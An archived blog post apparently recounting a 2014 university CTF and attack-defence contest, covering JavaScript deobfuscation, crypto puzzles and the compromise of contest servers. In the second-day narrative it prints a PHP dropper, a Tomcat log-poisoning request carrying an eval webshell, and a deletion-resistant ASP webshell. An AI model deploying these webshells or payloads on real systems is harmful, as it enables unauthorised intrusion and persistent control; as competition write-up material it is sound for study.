@@ -1,0 +1,903 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>360全国大学生信安技术大赛记录 | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                网络安全 &raquo; <a href="360-ctf-writeup.html">360全国大学生信安技术大赛记录</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">360全国大学生信安技术大赛记录</h1>
+            <div class="details-up">
+  <span class="author">作者: None</span>
+  
+  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
+  
+  <span class="date">时间: 2014-5-26 22:25</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">24条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="360-ctf-writeup.html">24371人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/writeup.html">writeup</a>
+    
+        <a href="../tag/ctf.html">ctf</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                <p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 大赛进行了两天，大起大落有，丧失信心也有，但最后还是挺过来了。多亏了给力的队友，blink和test，最后拿到了西北赛区的第二名。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 简单叙述一下整个过程吧，顺便记录一下平时没有注意的一些点。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 第一天的比赛是CTF类型的，实话说我不擅长这种类型的比赛，比赛经验不足，各种东西都快走到最后一步了但却不成功。第一道题js解密的就验证了这一点。这题的js代码是这样：</span> 
+</p>
+<pre class="brush: js;auto-links: false;">var qrivy = eval;NanylmrgurXrl="7D6A792B606E723629383D3B2B586A6D6E7F722B4864657F6E787F2B62782B4D7E6565722A296D7E65687F6264652B48636E68605B6A78782322707D6A792B6469615B6A7878366F64687E666E657F256C6E7F4E676E666E657F4972426F23297B6A787829227D6A792B7B6A7878366469615B6A7878257D6A677E6E2B626D2329606E722920606E7225787E69787F7962656C233B27382236367B6A787822706A676E797F2329606E722B62782B62652B7B6A787829222B766E67786E706A676E797F23295F79722B6A6C6A62652A29222B7676";
+ArrqrqSha="function Xrlzrgubq(){qnauhnatcnv=Math.PI;cnefrVag=parseInt;sov='length';jebat0=cnefrVag(~((qnauhnatcnv&amp;qnauhnatcnv)|(~qnauhnatcnv&amp;qnauhnatcnv)&amp;(qnauhnatcnv&amp;~qnauhnatcnv)|(~qnauhnatcnv&amp;~qnauhnatcnv)));lhn3afh=cnefrVag(((jebat0&amp;jebat0)|(~jebat0&amp;jebat0)&amp;(jebat0&amp;~jebat0)|(~jebat0&amp;~jebat0))&amp;1);/*Where is the key?! rot13 is the key.*/rknz6znbm=lhn3afh&lt;&lt;lhn3afh;erf0hygVfabg=jebat0;LbhT0gvg='';jvxvqrp0qr=eval(unescape('%5'+'3%74%'+'72%69%6'+'E%67%2E%'+'66%72%'+'6F%6D%4'+'3%68%61'+'%72%4'+'3%6F'+'%64%65'));nccy2vf=qrivy;for(c3ffc0eg=jebat0;c3ffc0eg&lt;ArrqrqSha[sov];c3ffc0eg-=-lhn3afh)erf0hygVfabg+=ArrqrqSha.charCodeAt(c3ffc0eg);erf0hygVfabg%=unescape(jebat0+unescape('x')+(1&lt;&lt;6));for(c3ffc0eg=jebat0;c3ffc0eg&lt;NanylmrgurXrl[sov];c3ffc0eg+=rknz6znbm)LbhT0gvg+=jvxvqrp0qr(cnefrVag(jebat0+unescape('x')+NanylmrgurXrl.charAt(c3ffc0eg)+NanylmrgurXrl.charAt(c3ffc0eg+cnefrVag(lhn3afh)))^erf0hygVfabg);nccy2vf(LbhT0gvg);}"</pre>
+<span style="font-size:14px;">&nbsp; &nbsp; 这种javascript我不怕，感觉就是那样跟。首先ArrqrqSha是一个字符串，但这个字符串内容是个函数，我就把这个函数提取出来美化（</span><a href="http://tool.p1ng.pw/jstool.html" target="_blank"><span style="font-size:14px;">http://tool.p1ng.pw/jstool.html</span></a><span style="font-size:14px;">）一下：</span> 
+<pre class="brush: js;auto-links: false;">function Xrlzrgubq() {
+	qnauhnatcnv = Math.PI;
+	cnefrVag = parseInt;
+	sov = 'length';
+	jebat0 = cnefrVag(~ ((qnauhnatcnv &amp; qnauhnatcnv) | (~qnauhnatcnv &amp; qnauhnatcnv) &amp; (qnauhnatcnv &amp; ~qnauhnatcnv) | (~qnauhnatcnv &amp; ~qnauhnatcnv)));
+	lhn3afh = cnefrVag(((jebat0 &amp; jebat0) | (~jebat0 &amp; jebat0) &amp; (jebat0 &amp; ~jebat0) | (~jebat0 &amp; ~jebat0)) &amp; 1); /*Where is the key?! rot13 is the key.*/
+	rknz6znbm = lhn3afh &lt;&lt; lhn3afh;
+	erf0hygVfabg = jebat0;
+	LbhT0gvg = '';
+	jvxvqrp0qr = eval(unescape('%5' + '3%74%' + '72%69%6' + 'E%67%2E%' + '66%72%' + '6F%6D%4' + '3%68%61' + '%72%4' + '3%6F' + '%64%65'));
+	nccy2vf = qrivy;
+	for (c3ffc0eg = jebat0; c3ffc0eg &lt; ArrqrqSha[sov]; c3ffc0eg -= -lhn3afh) erf0hygVfabg += ArrqrqSha.charCodeAt(c3ffc0eg);
+	erf0hygVfabg %= unescape(jebat0 + unescape('x') + (1 &lt;&lt; 6));
+	for (c3ffc0eg = jebat0; c3ffc0eg &lt; NanylmrgurXrl[sov]; c3ffc0eg += rknz6znbm) LbhT0gvg += jvxvqrp0qr(cnefrVag(jebat0 + unescape('x') + NanylmrgurXrl.charAt(c3ffc0eg) + NanylmrgurXrl.charAt(c3ffc0eg + cnefrVag(lhn3afh))) ^ erf0hygVfabg);
+	nccy2vf(LbhT0gvg);
+}</pre>
+<span style="font-size:14px;">&nbsp; &nbsp; 把这个函数放在原先那个js后面，然后Xrlzrgubq();调用。放浏览器中调试，可以看到报错信息：</span> 
+<p>
+	<br />
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp;&nbsp;&nbsp;&nbsp;</span><a target="_blank" href="../content/uploadfile/201405/a0171401115034.jpg" id="ematt:534"><img src="../content/uploadfile/201405/thum-a0171401115034.jpg" title="点击查看原图" alt="001.jpg" border="0" width="650" height="206" /></a> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 既然在这里报错，那么我在nccy2vf(LbhT0gvg);处下个断点，看看这两个变量的值是什么：</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp;&nbsp;&nbsp;&nbsp;</span><a target="_blank" href="../content/uploadfile/201405/11f51401115265.jpg" id="ematt:536"><img src="../content/uploadfile/201405/thum-11f51401115265.jpg" title="点击查看原图" alt="002.jpg" border="0" width="650" height="172" /></a> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 断下来之后，居然LbhT0gvg变量是一个长得很像KEY的字符串。于是我在控制台里把它输出来，我估计它就是key了：</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp;&nbsp;&nbsp;&nbsp;</span><a target="_blank" href="../content/uploadfile/201405/9c3c1401115370.jpg" id="ematt:538"><img src="../content/uploadfile/201405/thum-9c3c1401115370.jpg" title="点击查看原图" alt="003.jpg" border="0" width="650" height="53" /></a> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 这段代码啥意思就不太用解释了。我满以为自己找到key了。。。然后试了各种组合，key360、360key和rot_32过的字符串等等。。。全不对。到最后也没做出来。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 比赛完了我问基友，别人告诉我要把key360放在url里请求一下。。才会出来key。。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 这难道就是精神病人思路广吗？看来没有比赛经验，做题也很困难。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 不过两个给力的逆向大牛把开出来的逆向题都做了，以至于我们队伍的分数还不低。web题也很坑，第二道是让我们找dede的后台（什么dede，就是ctrl+s保存的一个静态页面，毫无实战意义），dede找后台的方法就那么几个，我下载了.inc文件。但inc文件太大，内容太多，我没仔细找，以至于到最后才在不起眼的角落里找到。（通过搜索login应该能很容易找到的，但是之前没想到）</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 第三道web题是任意文件读取，读到.htaccess是类似 ^bob rewrite.php，将bob开头的请求转到rewrite.php中，前面还检查了referer，不过不知道为何我之后试的一直不成功。因为我当时就读rewrite.php，但里面啥都没有，所以我就没多想。还是想吐槽一下360，真的毫无实战价值，既然你将^bob请求转到rewrite.php里，那rewrite.php里就应该有东西啊，结果读出来就一个echo。最后答案却在bob.php里，我请求http://xxx/bob.php的时候应该被转向到rewrite.php里了才对呀？这种毫无实战价值的题目，真想不到你们的工程师是怎么想到的。真垃圾。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 最后发现，最简单的其实还是加密解密的题目，40分的是一堆01，二进制的字符串，感觉是一个图片，拿前几位去解密发现是PK开头。看到PK开头我就知道是zip文件了，然后把字符串保存下来写了个脚本转换成二进制数据。后缀改成zip，解压得到一张图片，notepad打开图片找到一串base64字符串，解两次得到最终key。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 80分的题是一道古典密码题目，给了一个人的头像，求某串密文对应的明文：</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp;&nbsp;&nbsp;&nbsp;</span><a target="_blank" href="../content/uploadfile/201405/c0501401116468.jpg" id="ematt:540"><img src="../content/uploadfile/201405/thum-c0501401116468.jpg" title="点击查看原图" alt="004.jpg" border="0" width="650" height="281" /></a> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp;&nbsp;&nbsp;&nbsp;上谷歌图片搜索搜到的是</span><span style="white-space:normal;"><span style="font-size:14px;">维吉尼亚什么的，得知是</span><span style="white-space:normal;font-size:14px;">维吉尼亚密码。题目中给了两个明文和密文、密钥的对照，而我知道维吉尼亚密码是通过密码表维系的关系（题目告诉我们它改了改，那肯定就修改的是密码表了）</span></span><span style="font-size:14px;">，所以我们可以通过已知的对照组解出部分密码表，通过密码表来计算最后的key。不过最后没时间做了，这题也没做出来。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 其他题都是队友做的了。。我基本酱油了一天，搞的最后都没信心了。但队友还是很厉害地拿到了西北赛区的并列第一，也还好给我点鼓励。</span> 
+</p>
+<p>
+	<br />
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 第二天的比赛是纯实战的，队里就我一个做web的，还没有人做渗透。我一个程序员，不太会渗透，但硬着头也得上了。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 第一题是一个wordpress，还是感觉自己准备不足，居然手里没有好用的wpscan，kali里那个不好用。就先放着了。第三个服务器有两个站，discuz和thinksns，discuz3.0没戏，我就乌云上翻了翻thinksns，因为之前几个搞代码审计的审计了好些thinksns、thinksaas、记事狗这类的cms，所以还算比较熟悉。用了一个任意文件包含（</span><a href="http://www.wooyun.org/bugs/wooyun-2013-043945" target="_blank"><span style="font-size:14px;">http://www.wooyun.org/bugs/wooyun-2013-043945</span></a><span style="font-size:14px;">），注册个号发微博上传图片，能phpinfo。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 不过传了个一句话发现菜刀连不上，估计是被防火墙拦了。传大马能包含，但包含了执行出问题，估计是因为包含进去的大马变量受限制了。后来写了个脚本，在根目录生成了个大马：</span> 
+</p>
+<pre class="brush: php;auto-links: false;">&lt;?php
+file_put_contents('hehe.php', file_get_contents('刚才传上来的大马地址'));
+?&gt;</pre>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 然后拿下了shell。能执行命令，不过linux 2.6.18 64位，之前弹shell一直弹不了（被拦了，直接跳到360），我们又没有外网地址，只能用我一台windows vps做弹shell的服务器，metasploit也用不了。下午用习科大马里自带的弹shell功能弹了一个shell，但用了各种提权程序没成功，估计是因为64位的，我不太会。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 文件包含的洞补了以后就把这台服务器忘了（居然没想到多补几个，另一个地方还有任意文件上传）。第4台是一个dvbbs，不过我对asp和windows不太熟，然后没合适的路径扫描器（扫描器一扫就502，根本没法用），没扫到eweb。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 回到第一个wordpress，用wvs一爬发现有插件的任意文件包含。当时把我乐坏了，不过后来发现根本没地方可以上传文件，所以也没什么文件能包含。nginx日志没找到（找到了人说太大，没法包含，有无数人拿扫描器扫，导致日志太大</span><span style="font-size:14px;">），env环境变量网上说可以控制，我也没成功，shadow下下来没密码（有也破不出</span><span style="font-size:14px;">）。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 当时就绝望了。不过这台服务器上有个tomcat，我就开始翻tomcat文件。一个docs、一个exmaple，没啥线索，后台也找不着。然后神队友看到了wp一篇文章里有个url http://localhost:8080/qihoo，我当时看到了没在意，结果居然qihoo也是tomcat下一个目录。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; qihoo里一个文件，找到一个任意文件下载。这里犯了一个致命的错误，我下载了/etc/passwd，里面没密码。实际上有密码的是/etc/shadow，我却没有下。看来还是平时实战经验太少了，导致犯了这种错误。如果拿到密码，跑出来的话，就又能多100分了。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 通过这个任意文件下载，我下到了wp的config文件，数据库root权限不能外连，root密码也不是ssh密码。我之前一直以为wp的cookie和emlog一样，仅仅通过config.php文件中的auth来确定。我就在本地搭建了一个wp，把配置文件复制过来，结果拿到的cookie还是不能用。后来读代码发现cookie还跟用户密码的部分有关系，伪造也不行了。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 回到wp，知道了数据库是root后，我后来想找一个有注入的插件，能写个shell到网站目录下。或写到tmp目录，通过那个任意文件包含拿shell。但扫描器扫插件，扫10个有5个502，根本没法扫。只能一个一个手工试。在我试的时候，让神队友blink找找tomcat日志，结果还真被他找到了。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 地址是</span><span style="font-size:14px;">/usr/local/tomcat7/logs/localhost_access_log.2014-05-25.txt。日志下载下来只有40多M，应该可以包含的。但包含的时候发现似乎显示不完。我当时想显示不完不代表包含不完，于是我写了一个写shell的脚本，放在url后面访问了一下tomcat（浏览器会把空格等字符url 编码，得抓包把他们改回来</span><span style="font-size:14px;">）：</span> 
+</p>
+<pre class="brush: php;auto-links: false;">http://xxx:8080/?&lt;?php file_put_content('1.php','&lt;?php eval($_POST[a]);?&gt;');?&gt;</pre>
+<span style="font-size:14px;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="font-size:14px;">包含以后果然写了一个shell 1.php。菜刀成功连上。</span> 
+<p>
+	<br />
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; shell拿到以后我发现有人删shell，不过还好我机智无比，比赛前一天晚上我就写了几个脚本，防删shell用的。</span>
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; （被XX和谐）<br />
+</span>
+</p>
+&nbsp; &nbsp; <span style="font-size:14px;">这个脚本会常驻内存中，除非你重启服务器，否则它会每隔50毫秒检查一下自身（或xx.php）是否存在，不存在就把原内容再写进去，达到防删效果。</span><br />
+<p>
+	<br />
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 再来个asp的： </span>
+</p>
+<pre class="brush: vb;auto-links: false;">&lt;%
+dim file_name
+file_name = Server.MapPath("./") &amp; Replace(Request.ServerVariables("Script_Name"),"/","\")
+set fso = createobject("scripting.filesystemobject")
+set file = fso.getfile(file_name)
+file.attributes = 1+2+4
+
+if Request("never") &lt;&gt; empty then 
+	eval Request("never")
+end if
+%&gt;</pre>
+&nbsp; &nbsp; <span style="font-size:14px;">这个是将文件属性设置成系统+隐藏+只读，在菜刀里就删不掉了。除非你把属性再改回来。</span><br />
+<p>
+	<br />
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 回到比赛，连上shell后修复几个漏洞，uname发现又是刚才那个内核，64位。。。还是提不下。不过翻tomcat目录找到了管理员密码和后台，登录进去部署一个war拿下shell。不过那个shell太恶心了，路径是\不是/（写shell的时候没考虑过linux吗，真的很坑），导致传文件传不了，修改文件修不了，命令执行不了。。。然后没时间了，我就没继续试了。否则tomcat估计直接是root权限，能拿到100分的。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 第二个服务器也是很遗憾的，首页一张图片，看源码有个ssh，一个日期（其实这个日期居然就是这台服务器的root密码。。。但当时为啥没去试</span><span style="font-size:14px;">），图片是个图种，解压后一个pcap包，跑wpa的。。。结果队友跑了3个小时没出来。。。不知道为什么，可能是姿势不对，学弟3秒就跑出来了。。。就是那个日期。因为没跑出来，所以这个服务器一点没做，就丢了。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 第一天分数第一的队伍（坑学长）就是因为拿下了这个服务器获得了100分，最后抱得s4归，不过我居然觉得ipad mini比s4要好，哈哈。</span> 
+</p>
+<p>
+	<span style="font-size:14px;">&nbsp; &nbsp; 总体来说自己还是拖了队伍后腿，不过还好没有拖太狠。最后没拿下服务器，但修复漏洞也得了点分。帮助我很大的是我之前写的一个小工具集：<a href="http://tool.p1ng.pw/" target="_blank">http://tool.p1ng.pw/</a>，还有wooyun、wvs、谷歌，这也是实战中离不开的。<br />
+</span> 
+</p>
+<p>
+	<br />
+</p>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/writeup.html">writeup</a>
+                
+                    <a href="../tag/ctf.html">ctf</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 24 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-2052">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c8e1e5dfbddb46fad203b16f5dcdfa62.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://blog.kfd.me" target="_blank" rel="nofollow noopener">mr</a></div>
+                    <p>没想到我竟然从谷歌来到了这里- -<br>知道我搜的关键词是什么嘛？<br>where is the key?! rot13 is the key 360<br>也是醉了。。。</p>
+                    <span class="comment-time">时间: 2015-05-07 15:52</span>
+                    <span class="comment-reply"><a href="#comment-2052" onclick="reply_to('2052','mr')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-2008">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/1969cf040f3c974e5ace1bedcc7b2989.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">玻镁板</a></div>
+                    <p>好文章，内容惊心动魄.</p>
+                    <span class="comment-time">时间: 2015-04-02 16:53</span>
+                    <span class="comment-reply"><a href="#comment-2008" onclick="reply_to('2008','玻镁板')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1927">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c07547493e25b20d3f73252446009798.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.banshouseo.com/" target="_blank" rel="nofollow noopener">站长工具</a></div>
+                    <p>大神，请收下我的膝盖</p>
+                    <span class="comment-time">时间: 2015-01-27 10:23</span>
+                    <span class="comment-reply"><a href="#comment-1927" onclick="reply_to('1927','站长工具')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1791">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/08a04f62601d9c32e77067c5ae6a5cf6.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">求助</a></div>
+                    <p>大神你好，我想问一下那个2进制转16进制的脚本是怎么写的呀？可以发到我邮箱吗？谢谢啦！！</p>
+                    <span class="comment-time">时间: 2014-10-08 10:29</span>
+                    <span class="comment-reply"><a href="#comment-1791" onclick="reply_to('1791','求助')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1715">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c121b4d6f8c3123601549cf537e7d50b.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://wood-tree.com" target="_blank" rel="nofollow noopener">木树</a></div>
+                    <p>还真是术有专攻</p>
+                    <span class="comment-time">时间: 2014-07-10 05:07</span>
+                    <span class="comment-reply"><a href="#comment-1715" onclick="reply_to('1715','木树')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1691">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/300139c0b87bc95c2eb1496b4ae8b755.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">陆羽</a></div>
+                    <p>原来站长也参加了我们的比赛。呵呵。。。另外ssh那个root密码不是日期，后门密码才是</p>
+                    <span class="comment-time">时间: 2014-06-18 04:50</span>
+                    <span class="comment-reply"><a href="#comment-1691" onclick="reply_to('1691','陆羽')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1692">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.leavesongs.com/" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@陆羽：唉，技不如人，见笑。。。</p>
+                    <span class="comment-time">时间: 2014-06-18 07:09</span>
+                    <span class="comment-reply"><a href="#comment-1692" onclick="reply_to('1692','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1796">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/1987dba5837cf5f294a8ba1540f417a2.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="https://forum.90sec.org/" target="_blank" rel="nofollow noopener">linso</a></div>
+                    <p>@phithon：呵呵。土司、360的陆羽也来了。吓尿了</p>
+                    <span class="comment-time">时间: 2014-10-11 17:23</span>
+                    <span class="comment-reply"><a href="#comment-1796" onclick="reply_to('1796','linso')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1690">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.coffin5257.com" target="_blank" rel="nofollow noopener">coffin</a></div>
+                    <p>那个WP的服务器……下午哪个队就一直在跟我们死磕- -<br>到结束他们都快把WP后台删没了...</p>
+                    <span class="comment-time">时间: 2014-06-14 17:21</span>
+                    <span class="comment-reply"><a href="#comment-1690" onclick="reply_to('1690','coffin')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1681">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/ef2d8b52c284fbbd17b7a485dc26c6d8.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">夏殇</a></div>
+                    <p>360工作人员说wordpress下载etc/shadow破不了，当时我们在跑john，让我们直接放弃了，因为“我们是破不出来的”的说，然后不破了，ctrl+C</p>
+                    <span class="comment-time">时间: 2014-06-10 08:14</span>
+                    <span class="comment-reply"><a href="#comment-1681" onclick="reply_to('1681','夏殇')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1682">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.leavesongs.com/" target="_blank" rel="nofollow noopener">phithon</a></div>
+                    <p>@夏殇：wordpress下载的和tomcat下载的不一样吧？tomcat是root 权限，wp只是www权限。。。</p>
+                    <span class="comment-time">时间: 2014-06-10 09:53</span>
+                    <span class="comment-reply"><a href="#comment-1682" onclick="reply_to('1682','phithon')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-1683">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/ef2d8b52c284fbbd17b7a485dc26c6d8.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">夏殇</a></div>
+                    <p>@phithon：酱紫啊</p>
+                    <span class="comment-time">时间: 2014-06-11 01:13</span>
+                    <span class="comment-reply"><a href="#comment-1683" onclick="reply_to('1683','夏殇')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
